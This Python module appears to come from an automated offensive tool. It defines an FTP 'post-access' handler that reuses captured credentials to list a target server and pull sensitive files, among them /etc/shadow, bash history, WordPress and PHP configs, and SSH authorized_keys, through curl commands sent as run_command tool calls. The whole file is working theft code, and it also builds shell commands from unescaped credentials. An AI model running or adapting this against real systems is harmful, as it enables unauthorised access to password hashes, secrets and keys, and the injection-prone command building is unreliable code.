"""Post-access handler for authenticated FTP enumeration."""

from __future__ import annotations

from typing import TYPE_CHECKING

from .base import BasePostAccessHandler
from .types import AccessType, PostAccessResult

if TYPE_CHECKING:
    from hydrasight.services.dispatcher import Dispatcher


class FTPAccessHandler(BasePostAccessHandler):
    """Post-access enumeration via an authenticated FTP session.

    Uses ``curl`` to authenticate and list the directory structure, then
    attempts to retrieve interesting files (``/etc/passwd``, web configs,
    SSH keys, etc.).
    """

    access_type = AccessType.FTP

    # Files to attempt to retrieve.
    INTERESTING_PATHS = [
        "/etc/passwd",
        "/etc/shadow",
        ".bash_history",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/home/*/.ssh/authorized_keys",
    ]

    def execute(
        self,
        dispatcher: Dispatcher,
        target: str,
        lhost: str,
        lport: int,
        cfg: dict,
    ) -> PostAccessResult:
        username = self.session.get("username", "")
        password = self.session.get("password", self.session.get("secret", ""))
        rport = int(self.session.get("rport", 21))

        if not (username and password):
            return PostAccessResult.failure(self.access_type, "no credentials in session record")

        self.log.info("ftp post-access: %s@%s:%d", username, target, rport)
        output_parts: list[str] = []
        artifacts: list[str] = []

        # ── step 1: list root directory ─────────────────────────────────────
        list_cmd = (
            f"curl -s --connect-timeout 10 "
            f"--user '{username}:{password}' "
            f"ftp://{target}:{rport}/ 2>&1"
        )
        try:
            _, listing, _ = dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": list_cmd}}
            )
            if listing:
                output_parts.append(f"=== FTP ROOT LISTING ===\n{listing}")
        except Exception as exc:  # noqa: BLE001 — isolate per-handler failure
            return PostAccessResult.failure(self.access_type, f"ftp listing error: {exc}")

        if not listing or "error" in listing.lower() or "failed" in listing.lower():
            return PostAccessResult.failure(
                self.access_type, "ftp authentication failed or no listing"
            )

        # ── step 2: attempt to retrieve interesting files ───────────────────
        for path in self.INTERESTING_PATHS:
            try:
                get_cmd = (
                    f"curl -s --connect-timeout 8 "
                    f"--user '{username}:{password}' "
                    f"ftp://{target}:{rport}{path} 2>&1"
                )
                _, content, _ = dispatcher.dispatch(
                    {"tool": "run_command", "args": {"command": get_cmd}}
                )
                if content and "error" not in content.lower()[:50]:
                    output_parts.append(f"=== {path} ===\n{content[:2000]}")
                    artifacts.append(path)
            except Exception:  # noqa: BLE001 — file not accessible; skip silently
                continue

        full_output = "\n\n".join(output_parts)
        return PostAccessResult(
            access_type=self.access_type,
            success=bool(full_output),
            output=full_output,
            hashes=[],
            credentials=[],
            artifacts=artifacts,
            notes=(f"ftp {username}@{target}:{rport}  files retrieved: {len(artifacts)}"),
        )
